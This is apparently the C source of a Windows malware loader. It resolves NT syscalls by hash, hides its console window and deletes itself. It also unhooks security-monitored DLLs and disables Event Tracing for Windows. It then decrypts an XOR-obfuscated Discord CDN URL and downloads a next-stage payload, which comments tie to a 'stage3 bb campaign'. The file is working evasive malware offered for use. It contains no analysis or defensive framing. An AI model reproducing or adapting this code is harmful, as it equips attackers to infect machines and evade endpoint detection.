#include "definitions.h"
#include "peb_structs.h"
#include "dllparsing.h"
#include "unhooking.h"
#include "stringObfuscator.h"
#include "WebUtilities.h"
#include "Evasion.h"
#include "utilities.h"


#pragma comment (lib, "advapi32")

//This function obtains a pointer to the TEB using the GS register + 48 bytes (30 hex)
//then using the TEB we obtain a pointer to the PEB and return that value.
PPEB GetPointerToPEB() {
	PTEB pTEB = RtlGetThreadEnvironmentBlock();
	PPEB pPEB = pTEB->ProcessEnvironmentBlock;
	if (!pTEB || !pPEB || pPEB->OSMajorVersion != 0xA) {
		exit(-1);
	}
	return pPEB;
}

void PopulateVxTable(PVX_TABLE table, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PLDR_DATA_TABLE_ENTRY pLdrDataEntry) {

	//populate api hashes in table.
	table->NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	table->NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	table->NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	table->NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	table->NtQueryVirtualMemory.dwHash = 0x683158f59618ee0c;
	table->NtOpenProcess.dwHash = 0x718CCA1F5291F6E7;
	table->NtOpenFile.dwHash = 0x4A063563C4387908;
	table->NtCreateSection.dwHash = 0xF38A8F71AF24371F;
	table->NtMapViewOfSection.dwHash = 0xF037C7B73290C159;
	table->NtReadFile.dwHash = 0x4A06357E3033C3D2;
	table->NtCreateFile.dwHash = 0xE4672568EEF00D8A;

	//9618ee0c
	//0xffffffff9618ee0c
	//0x683158f59618ee0c

	//retieve api locations & syscalls and populate them in the table
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtAllocateVirtualMemory))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateThreadEx))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtProtectVirtualMemory))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtWaitForSingleObject))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtQueryVirtualMemory))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenProcess))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenFile))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateSection))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtMapViewOfSection))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtReadFile))
		exit(-1);
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateFile))
		exit(-1);
}


int main(void){

	WCHAR sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
	WCHAR sU32[] = { 'U','s','e','r','3','2','.','d','l','l',0x0 };

	const char sGetConsoleWindow[] = { 'G','e','t','C','o','n','s','o','l','e','W','i','n','d','o','w',0x0 };
	const char sShowWindow[] = { 'S','h','o','w','W','i','n','d','o','w',0x0 };

	customLoadLibrary(sU32);

	t_GetConsoleWindow pGetConsoleWindow = (t_GetConsoleWindow)hlpGetProcAddress(hlpGetModuleHandle(sKernel32), sGetConsoleWindow);
	t_ShowWindow pShowWindow = (t_ShowWindow)hlpGetProcAddress(hlpGetModuleHandle(sU32), sShowWindow);

	//don't show process window when running executable through double clicking.
	// will also hide the process window if ran from the commandline.
	pShowWindow(pGetConsoleWindow(), SW_HIDE);

	selfDelete();

	//obtain pointer to PEB.
	PPEB pPEB = GetPointerToPEB();

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	//Get EAT Table
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		exit(-1);
	//Create VXTable
	VX_TABLE table = { 0 };

	//Populate its entries
	PopulateVxTable(&table, pImageExportDirectory, pLdrDataEntry);
	WCHAR strAdvapidll[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0x0 };

	//LoadLibraries needed for Unhooking
	customLoadLibrary(strAdvapidll);

	//unhook necessary DLLs
	UnhookStart(&table);
	//disable event tracing for windows.
	DisableETW();

	// xor encrypted strings of our discord files.
	//xorencrypt((char*)"https://cdn.discordapp.com/attachments/934181360782954499/934215446364835891/BreadManModuleStomping_b64.txt", "This Is the Secret Key");
	//xorencrypt((char*)"https://cdn.discordapp.com/attachments/934181360782954499/937964385916289104/stage3_bb_b64.txt", "This Is the Secret Key");
	// for the BreadManModuleStomping PE payload.
	//char encrypted[] = { 0x3c,0x1c,0x1d,0x03,0x53,0x73,0x5c,0x0f,0x17,0x0c,0x0b,0x0e,0x37,0x0c,0x10,0x11,0x0a,0x06,0x44,0x2a,0x15,0x09,0x7a,0x0b,0x06,0x1e,0x0f,0x28,0x07,0x54,0x15,0x0b,0x0d,0x4d,0x36,0x0b,0x17,0x01,0x4a,0x4d,0x13,0x7f,0x54,0x41,0x65,0x5b,0x5f,0x43,0x17,0x71,0x41,0x19,0x41,0x5c,0x51,0x19,0x6a,0x4a,0x5a,0x41,0x51,0x46,0x11,0x7e,0x51,0x4d,0x62,0x5b,0x5f,0x47,0x18,0x7a,0x46,0x18,0x4d,0x59,0x4a,0x62,0x21,0x00,0x02,0x16,0x28,0x15,0x4e,0x06,0x0a,0x1d,0x21,0x04,0x0c,0x20,0x54,0x26,0x1e,0x50,0x1d,0x06,0x02,0x7f,0x31,0x53,0x57,0x5c,0x11,0x0c,0x54 };
	//for the stage3 bb campaign
	char encrypted[] = { 0x3c,0x1c,0x1d,0x03,0x53,0x73,0x5c,0x0f,0x17,0x0c,0x0b,0x0e,0x37,0x0c,0x10,0x11,0x0a,0x06,0x44,0x2a,0x15,0x09,0x7a,0x0b,0x06,0x1e,0x0f,0x28,0x07,0x54,0x15,0x0b,0x0d,0x4d,0x36,0x0b,0x17,0x01,0x4a,0x4d,0x13,0x7f,0x54,0x41,0x65,0x5b,0x5f,0x43,0x17,0x71,0x41,0x19,0x41,0x5c,0x51,0x19,0x6a,0x4a,0x5a,0x41,0x52,0x4d,0x16,0x7f,0x56,0x41,0x61,0x51,0x58,0x45,0x12,0x71,0x4a,0x11,0x44,0x5c,0x4a,0x53,0x27,0x04,0x04,0x17,0x56,0x2b,0x42,0x29,0x3a,0x1b,0x62,0x5c,0x47,0x07,0x58,0x3d };
	//xor encrypted strings of the target file path we're going to download to.
	//char encryptedFilePathPart1[] = { 0x17,0x52,0x35,0x26,0x53,0x2c,0x01,0x53,0x28 };
	//char encryptedFilePathPart2[] = { 0x08,0x29,0x19,0x03,0x64,0x28,0x07,0x41,0x28,0x24,0x0a,0x43,0x32,0x09,0x3f,0x26,0x00,0x19,0x50,0x17 };

	// xor decrypted versions of the strings above.
	char* discord_cdn1 = stringDeobfuscator(encrypted, sizeof(encrypted));

	//create places to hold the url strings
	LPVOID hostName = (char*)malloc(50);
	LPVOID resourcePath = (char*)malloc(150);

	//char userName[50];
	//DWORD outSize;

	//t_GetUserNameA pGetUserNameA = NULL;
//	WCHAR strAdvapi32dll[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0x0 };
	//char strGetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0x0 };
	//pGetUserNameA = (t_GetUserNameA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapi32dll), strGetUserNameA);
	//pGetUserNameA(userName, &outSize);

	//initialize room for entire file path -minus the file name.
	//char filePath[260] = { 0 };
	//LPVOID filePath = (char*)malloc(260); // 260 b/c max file path length in windows.

	//char* filePathPart1 = stringDeobfuscator(encryptedFilePathPart1, sizeof(encryptedFilePathPart1));
	//char* filePathPart2 = stringDeobfuscator(encryptedFilePathPart2, sizeof(encryptedFilePathPart2));
	
	//Create File Path using C:\Users\ as part 1 + UserName + \ AppData Microsoft folder.
	// lstrcatA(filePath, filePathPart1);
	 //lstrcatA(filePath, userName);
	 //lstrcatA(filePath, filePathPart2);

	//parse URL to perform download properly.
	parseUrl(discord_cdn1, (char*)hostName, (char*)resourcePath);
	//download file and save it to disk.
	do_request((const char*)hostName, (const char*)resourcePath, "x-goog-stored-content-length");// , filePath);
	
	return 0;
}